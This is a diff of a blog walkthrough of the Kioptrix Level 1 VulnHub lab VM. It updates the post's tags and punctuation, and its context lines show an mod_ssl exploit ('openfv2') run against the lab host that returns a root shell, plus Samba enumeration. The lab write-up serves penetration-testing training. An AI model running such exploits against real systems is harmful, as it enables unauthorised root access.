@@ -4,7 +4,7 @@ title:  "Kioptrix: Level 1 (#1)"
 date:   2019-05-11 01:56:23 +0000
 author: Larry Brown
 category: Walkthroughs
-tags: [kioptrix]
+tags: [kioptrix, mod_ssl, samba]
 ---
     <div>VulnHub URL: <a target="_blank" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></div>
     <div>Hostname: kioptrix</div>
@@ -226,7 +226,7 @@ tags: [kioptrix]
         <div>[...snip...]</div>
     </div>
     <div><br /></div>
-    <div>Trying the first option (0x6a) fails. Trying the second option (0x6b), we get the following…</div>
+    <div>Trying the first option (0x6a) fails. Trying the second option (0x6b), we get the following...</div>
     <div><br /></div>
     <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
         <div>root@kali:~/Walkthroughs/kioptrix1# ./openfv2 0x6b 10.183.0.224</div>
@@ -271,7 +271,7 @@ tags: [kioptrix]
         <div>[+] Attached to 7398</div>
         <div>[+] Signal caught</div>
         <div>[+] Shellcode placed at 0x4001189d</div>
-        <div>[+] Now wait for suid shell…</div>
+        <div>[+] Now wait for suid shell...</div>
         <div>id</div>
         <div>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</div>
     </div>
@@ -355,7 +355,7 @@ tags: [kioptrix]
     <div><br /></div>
     <div><span style="font-weight: bold;">Other Paths to Root?</span></div>
     <div><br /></div>
-    <div>The intro message for the VM said…</div>
+    <div>The intro message for the VM said...</div>
     <div><br /></div>
     <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
         <div>Welcome to Kioptrix Level 1 Penetration and Assessment Environment</div>
@@ -490,7 +490,7 @@ tags: [kioptrix]
     <div><br /></div>
     <div><img src="/assets/images/2019-05-10-kioptrix-level-1/09AE1453-64A0-48F5-9CF8-F4C4CAD3BD46.png" height="526" width="1026" /><br /></div>
     <div><br /></div>
-    <div>Looks like mod_perl might be set up on the server. Based on this, plus the fact that ’test.php’ wasn’t being recognized as PHP code, me thinks PHP is not going to be the language of choice. I also know that MRTG is written in perl, so everything is pointing to the fact that Perl is going to be the only language supported… which is tough to embed in regular HTML pages. Moving on...</div>
+    <div>Looks like mod_perl might be set up on the server. Based on this, plus the fact that ’test.php’ wasn’t being recognized as PHP code, me thinks PHP is not going to be the language of choice. I also know that MRTG is written in perl, so everything is pointing to the fact that Perl is going to be the only language supported... which is tough to embed in regular HTML pages. Moving on...</div>
     <div><br /></div>
     <div>Looking at the samba service, I decided to use enum4linux to pull a bunch of details. I also ran ’smb-vuln-*’ scripts provided by nmap.</div>
     <div><br /></div>
@@ -608,6 +608,5 @@ tags: [kioptrix]
     </div>
     <div><br /></div>
     <div>And we found another path to root. 😄</div>
-    <div><br /></div>
     <div><br /></div>
     <div><br /></div>
